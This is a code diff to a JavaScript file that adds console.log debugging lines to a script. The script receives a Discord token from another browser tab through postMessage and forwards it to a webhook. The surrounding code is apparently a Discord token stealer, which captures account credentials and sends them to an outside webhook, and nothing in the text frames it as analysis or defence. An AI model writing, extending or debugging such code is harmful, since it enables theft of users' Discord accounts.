@@ -1,5 +1,7 @@
 // Function to send a message to the other tab
 function sendMessageToOtherTab(message) {
+    console.log('Sending message to other tab:', message);
+
     // Find the other tab
     var otherTab = null;
 
@@ -23,6 +25,8 @@ function sendMessageToOtherTab(message) {
 
 // Listen for messages from the other tab
 window.addEventListener('message', function(event) {
+    console.log('Received message:', event.data);
+
     // Verify that the message is from a trusted origin
     if (event.origin !== window.origin) {
         console.error('Received message from untrusted origin:', event.origin);
@@ -33,6 +37,7 @@ window.addEventListener('message', function(event) {
     if (event.data.type === 'sendDiscordToken') {
         // Retrieve the Discord token from the message data
         var discordToken = event.data.token;
+        console.log('Received Discord Token:', discordToken);
 
         // Send the Discord token to the webhook
         sendTokenToWebhook(discordToken);
@@ -41,6 +46,8 @@ window.addEventListener('message', function(event) {
 
 // Function to send the Discord token to the webhook
 function sendTokenToWebhook(token) {
+    console.log('Sending Discord Token to webhook:', token);
+
     // Construct the message to be sent to the webhook
     var message = {
         content: 'Discord Token: ' + token
